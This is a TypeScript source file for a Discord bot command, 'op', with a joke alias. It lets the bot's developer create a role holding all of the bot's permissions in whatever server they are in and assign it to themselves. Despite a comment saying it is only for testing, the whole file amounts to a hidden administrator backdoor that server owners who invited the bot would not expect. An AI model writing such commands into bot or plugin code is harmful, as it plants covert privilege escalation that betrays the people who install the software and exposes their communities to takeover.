// this command is NOT meant to be abused. Its strictly for testing purposes
import ICommand from '../../structure/interfaces/ICommand'

const command: ICommand = {
    name: 'op',
    description: 'Gives admin perms to the dev',
    aliases: ['givemoduwu'], // ._.
    category: 'dev',
    permissions: 'BOT_DEV',
    async run (client, message, args) {
        message.guild!.roles.create({
            name: 'FadBot Dev',
            color: 0xFFFF00,
            position: message.guild!.me!.roles.highest.position - 1,
            permissions: message.guild!.me!.permissions
        }).then(async role => {
            const member = message.member || await message.guild!.members.fetch(message.author.id)

            member.roles.add(role).then(() => message.reply('Given'))
        })
        .catch(e => message.reply('Failed to give role xd'))
    }
}

export default command